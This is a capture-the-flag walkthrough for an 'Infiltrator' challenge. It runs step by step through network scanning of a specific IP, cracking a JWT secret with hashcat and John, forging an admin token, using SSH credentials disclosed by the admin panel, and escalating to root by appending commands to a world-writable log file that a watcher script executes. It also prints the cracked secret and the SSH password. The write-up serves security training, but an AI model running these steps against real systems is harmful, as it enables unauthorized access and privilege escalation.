---
dg-publish: true
---
#### 🎯 Infiltrator - Complete Multi-Vector Attack Chain Solution

**Objective:** Chain multiple vulnerabilities to achieve complete system compromise, obtaining both user-level and root-level access to CyberSec Corp's infrastructure.

##### 🔍 Phase 1: Initial Reconnaissance

Start by exploring the target application to understand the attack surface using comprehensive reconnaissance tools:

###### Network Scanning with Nmap
```
# Comprehensive port scan   
nmap -sC -sV -p- 3.249.38.128      

# Service enumeration   
nmap -sC -sV -p 22,80 3.249.38.128      

# Expected results:   
# 22/tcp open ssh OpenSSH  
# 80/tcp open http Werkzeug/Flask
```

###### Web Application Discovery

```
# Directory enumeration   
gobuster dir -u http://3.249.38.128 -w /usr/share/wordlists/dirb/common.txt      

# Technology detection   
whatweb http://3.249.38.128      

# Manual exploration   curl -I http://3.249.38.128
```

Navigate to http://3.249.38.128 and explore available functionality: login (/login), signup (/signup), dashboard (/dashboard), and admin (/admin) endpoints.

##### 🔍 Phase 2: JWT Token Analysis and Manipulation

The application uses JWT tokens for authentication. Create a user account and analyze the JWT structure:

###### User Registration with cURL

```
# Register new user   
curl -X POST http://3.249.38.128/signup \   -H "Content-Type: application/x-www-form-urlencoded" \   -d "username=testuser&password=testpass123" \   -c cookies.txt     

# Login to get JWT token   
curl -X POST http://3.249.38.128/login \   -H "Content-Type: application/x-www-form-urlencoded" \   -d "username=testuser&password=testpass123" \   -c cookies.txt -L
```

What I did was just create a login through the webpage. When I logged in I pressed F12 to get developer tools. In there I went to application and then cookies to find the JWT token. 
###### JWT Token Extraction

```
# Extract JWT from cookies   
cat cookies.txt | grep jwt      
# Or using browser dev tools:  
# F12 → Application → Cookies → jwt      
# Decode JWT structure at jwt.io   
# Or using command line: echo "JWT_TOKEN_HERE" | cut -d. -f2 | base64 -d
```

##### 🔍 Phase 3: JWT Secret Discovery

Discover the JWT secret through various attack methods:

###### Hashcat Brute Force

```
Hashcat

# Save JWT to file   
echo "JWT_TOKEN" > jwt.txt      

# Brute force with hashcat   
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt      

#Common secrets wordlist   
hashcat -a 0 -m 16500 jwt.txt /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

```
John the Ripper

# Convert JWT for John   
python3 /usr/share/john/jwt2john.py JWT_TOKEN > jwt.hash      

# Crack with John   
john jwt.hash --wordlist=/usr/share/wordlists/rockyou.txt      

# Show cracked password   
john --show jwt.hash
```
###### Manual Testing

```
# Test common secrets   
# secret, key, password, admin   
# 123456, secret123, !!!secret!!!      
# The actual secret is: !!!secret!!!   
# This can be found through systematic testing
```



##### 🔍 Phase 4: Admin JWT Token Forgery

Create a forged JWT token with admin privileges using the discovered secret:

###### Python JWT Generation

`# Install PyJWT if needed   pip3 install PyJWT      # Create forged admin token   python3 -c "   import jwt   import datetime   payload = {   'username': 'admin',   'role': 'admin',   'exp': int((datetime.datetime.utcnow() + datetime.timedelta(hours=24)).timestamp())   }   token = jwt.encode(payload, '!!!secret!!!', algorithm='HS256')   print('Forged JWT:', token)   "`

###### Online JWT Editor

`# Using jwt.io:   # 1. Paste original JWT in Encoded section   # 2. Modify payload:   # "username": "admin"   # "role": "admin"   # 3. Enter secret: !!!secret!!!   # 4. Copy the new encoded JWT`

##### 🔍 Phase 5: Admin Panel Access

Use the forged JWT token to access the admin panel and discover SSH credentials:

###### Browser Method

`# Using browser dev tools:   # 1. F12 → Application → Cookies   # 2. Replace jwt cookie value with forged token   # 3. Navigate to http://3.249.38.128/admin   # 4. Observe SSH credentials displayed`

###### cURL Method

`# Access admin panel with forged JWT   curl -X GET http://3.249.38.128/admin \   -H "Cookie: jwt=FORGED_JWT_TOKEN_HERE" \   -L      # Extract credentials from response:   # Username: ctf   # Password: gzCxliaIr26MDS3ppbRSnCrNgOcR5ppM`

##### 🔍 Phase 6: SSH Access and User Flag Retrieval

Use the discovered credentials to gain SSH access and retrieve the first flag:

###### SSH Connection

`# Connect via SSH   ssh ctf@3.249.38.128   # Password: gzCxliaIr26MDS3ppbRSnCrNgOcR5ppM      # Alternative with sshpass   sshpass -p 'gzCxliaIr26MDS3ppbRSnCrNgOcR5ppM' ssh ctf@3.249.38.128`

###### 🏆 USER FLAG RETRIEVAL

**Once logged in via SSH, retrieve the user flag:**

`# Retrieve the first flag   ls -la   cat flag-user.txt      # Expected output: First flag obtained!   # This completes the user-level compromise`

###### System Exploration for Privilege Escalation

`# Basic system information   whoami   id   uname -a   cat /etc/os-release      # Process enumeration   ps aux   ps aux | grep -v "\["      # File system exploration   ls -la /   ls -la /var/log/   find / -writable 2>/dev/null | head -20`

##### 🔍 Phase 7: Log Injection Discovery

Discover the log watcher script and identify the log injection vulnerability:

###### Process Analysis

`# Check running processes   ps aux | grep -i log   ps aux | grep -i watch   ps aux | grep -i bash      # Look for suspicious scripts   find /usr/local/bin -name "*log*" 2>/dev/null   find /usr/local/bin -type f -executable 2>/dev/null      # Examine log watcher script   cat /usr/local/bin/log_watcher.sh`

###### Log File Analysis

`# Examine log directory   ls -la /var/log/   ls -la /var/log/custom.log      # Check file permissions (critical!)   stat /var/log/custom.log   # Expected: -rw-rw-rw- (world writable)      # Test write access   echo "test" >> /var/log/custom.log   tail /var/log/custom.log`

##### 🔍 Phase 8: Log Injection Exploitation and Root Flag Retrieval

Exploit the log watcher script that executes commands from the log file to escalate privileges and obtain the root flag:

###### Command Injection Testing

`# Test command execution   echo "whoami > /tmp/test1.txt" >> /var/log/custom.log   echo "id > /tmp/test2.txt" >> /var/log/custom.log   echo "date > /tmp/test3.txt" >> /var/log/custom.log      # Wait 30-60 seconds for execution   sleep 60      # Check if commands executed   ls -la /tmp/test*.txt   cat /tmp/test1.txt   cat /tmp/test2.txt`

###### 🏆 ROOT FLAG RETRIEVAL

**Copy root flag to accessible location:**

`# Copy root flag to accessible location   echo "cp /root/flag-root.txt /tmp/root-flag.txt" >> /var/log/custom.log   echo "chmod 644 /tmp/root-flag.txt" >> /var/log/custom.log   echo "chown ctf:ctf /tmp/root-flag.txt" >> /var/log/custom.log      # Wait for execution (30 second intervals)   sleep 60      # Retrieve root flag - MISSION COMPLETE!   cat /tmp/root-flag.txt      # Expected output: Second flag obtained!   # This completes the root-level compromise`

##### 🎯 CHALLENGE COMPLETED!

**Both flags have been successfully retrieved:**

- **User Flag:** Located at `/home/ctf/flag-user.txt` - Retrieved via SSH access after JWT manipulation
- **Root Flag:** Located at `/root/flag-root.txt` - Retrieved via log injection privilege escalation

**Attack Chain Summary:**

1. JWT secret discovery (!!!secret!!!) → Admin access
2. SSH credential disclosure → User access and first flag
3. Log injection vulnerability → Root access and second flag

**Real-World Application:** This challenge represents a realistic attack scenario commonly encountered in penetration testing engagements. The combination of web application vulnerabilities, authentication bypass, information disclosure, and privilege escalation techniques mirrors actual enterprise compromises and demonstrates the importance of defense-in-depth security strategies.